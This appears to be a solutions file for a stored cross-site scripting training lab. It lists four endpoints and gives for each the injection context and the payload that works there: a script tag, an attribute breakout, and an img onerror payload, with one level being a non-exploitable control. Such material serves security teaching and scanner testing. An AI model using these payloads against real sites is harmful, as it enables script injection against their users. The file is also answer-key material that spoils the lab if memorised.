# stored — solutions

Classic stored XSS endpoints: input persisted server-side, then reflected on subsequent renders.

### stored-level1

`[POST] /stored/level1/`

- payload: `<script>alert(1)</script>`
- body: `query=<script>alert(1)</script>`
- context: raw reflection inside `<li>` — no filtering

### stored-level2

`[POST] /stored/level2/`

- payload: `no payload — control`
- context: submitted via POST (`query=<script>alert(1)</script>`) and rendered as
  `<li>` text content, but `strip_angles` removes `<`/`>` before storage, so no
  markup can be introduced — a `<script>` body stores and renders as inert text.
  A defensive stub with no working bypass.

### stored-level3

`[POST] /stored/level3/`

- payload: `" onmouseover=alert(1) x="`
- body: `query=" onmouseover=alert(1) x="`
- context: raw inside `<div title="...">`, body encodes angles — attribute breakout

### stored-level4

`[POST] /stored/level4/`

- payload: `<img src=x onerror=alert(1)>`
- body: `query=<img src=x onerror=alert(1)>`
- context: JSON API entries concatenated into `<p>...</p>` via innerHTML
